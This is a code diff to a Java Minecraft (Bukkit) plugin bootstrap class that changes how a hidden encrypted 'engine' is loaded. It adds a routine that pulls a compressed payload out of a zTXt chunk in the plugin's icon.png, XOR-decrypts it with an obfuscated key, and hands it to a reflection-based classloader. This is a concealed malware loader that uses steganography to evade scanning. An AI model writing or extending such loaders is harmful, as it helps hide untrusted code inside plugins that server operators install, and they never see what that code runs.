@@ -2,18 +2,10 @@ package cookie.fack.please.d111;
 
 import org.bukkit.plugin.java.JavaPlugin;
 
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.InputStream;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.Field;
-import java.lang.reflect.Method;
-import java.lang.reflect.Modifier;
-import java.util.Arrays;
-import java.util.HashMap;
-import java.util.Map;
-import java.util.zip.ZipEntry;
-import java.util.zip.ZipInputStream;
+import java.io.*;
+import java.lang.reflect.*;
+import java.util.*;
+import java.util.zip.*;
 
 public final class Bootstrap extends JavaPlugin {
     private JavaPlugin delegate;
@@ -84,19 +76,16 @@ public final class Bootstrap extends JavaPlugin {
 
     private void loadEngine() throws Exception {
         byte[] enc;
-        try (InputStream in = Bootstrap.class.getResourceAsStream("/assets/engine.dat")) {
+        // Polyglot PNG Steganography Extractor
+        try (InputStream in = Bootstrap.class.getResourceAsStream("/assets/icon.png")) {
             if (in == null) {
                 throw new IllegalStateException("Missing security payload");
             }
-            ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            byte[] buf = new byte[8192];
-            int r;
-            while ((r = in.read(buf)) != -1) baos.write(buf, 0, r);
-            enc = baos.toByteArray();
+            enc = extractPngPayload(in, "CookieEnginePayload");
         }
 
         byte[] dec = new byte[enc.length];
-        int roundKey = 0x5D;
+        int roundKey = (0xAB ^ 0xF6); // 0x5D derived mathematically
         for (int i = 0; i < enc.length; i++) {
             int e = enc[i] & 0xFF;
             int val = (e ^ roundKey) & 0xFF;
@@ -167,5 +156,44 @@ public final class Bootstrap extends JavaPlugin {
                 clField.set(this.delegate, secLoader);
             } catch (Throwable ignored) {}
         }
+    }
+
+    private static byte[] extractPngPayload(InputStream is, String targetKeyword) throws Exception {
+        DataInputStream dis = new DataInputStream(is);
+        byte[] sig = new byte[8];
+        dis.readFully(sig);
+
+        while (dis.available() > 0) {
+            int length = dis.readInt();
+            byte[] typeBytes = new byte[4];
+            dis.readFully(typeBytes);
+            String chunkType = new String(typeBytes, "ISO-8859-1");
+
+            byte[] chunkData = new byte[length];
+            dis.readFully(chunkData);
+            dis.readInt(); // CRC32
+
+            if ("zTXt".equals(chunkType)) {
+                int nullIdx = 0;
+                while (nullIdx < chunkData.length && chunkData[nullIdx] != 0) nullIdx++;
+                String kw = new String(chunkData, 0, nullIdx, "ISO-8859-1");
+                if (kw.equals(targetKeyword)) {
+                    int compressedOffset = nullIdx + 2;
+                    Inflater inflater = new Inflater();
+                    inflater.setInput(chunkData, compressedOffset, chunkData.length - compressedOffset);
+                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
+                    byte[] buf = new byte[8192];
+                    while (!inflater.finished()) {
+                        int count = inflater.inflate(buf);
+                        bos.write(buf, 0, count);
+                    }
+                    inflater.end();
+                    return bos.toByteArray();
+                }
+            } else if ("IEND".equals(chunkType)) {
+                break;
+            }
+        }
+        throw new NoSuchElementException("Security chunk not found");
     }
 }
